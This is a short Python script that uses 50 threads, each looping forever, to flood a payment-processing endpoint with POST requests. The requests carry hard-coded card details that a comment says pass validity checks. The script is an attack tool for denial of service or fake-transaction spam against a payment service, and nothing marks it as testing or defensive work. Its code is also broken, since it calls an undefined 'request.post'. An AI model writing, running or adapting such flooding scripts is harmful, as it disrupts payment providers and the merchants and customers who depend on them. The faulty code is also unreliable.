# Importing the 'requests' module to send HTTP requests
import requests
# Importing the 'threading' module to add threading support to send multiple requests
import threading

# URL of the payment processing to send POST requests to
url = 'http://...'

## Data to send with the POST request
#Pseudo payment information 
#This exact card number passes card validity checks
data = {
    'cc_number' : '4007000000027',
    'cc_expmonth' : '08',
    'cc_expyear' : '24',
    'cc_cvv' : '234',
}

# Function that sends POST requests with the specified data, runs infinitely until program is terminated
def do_request():
    while True:
        response = request.post(url, data=data).text
        print(response)

# Creating a list to hold all the threads
threads = []

# Creating 50 threads that will execute the 'do_request' function in parallel
for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

# Starting all the threads
for i in range(50):
    threads[i].start()

# Waiting for all the threads to finish executing
for i in range(50):
    threads[i].join()
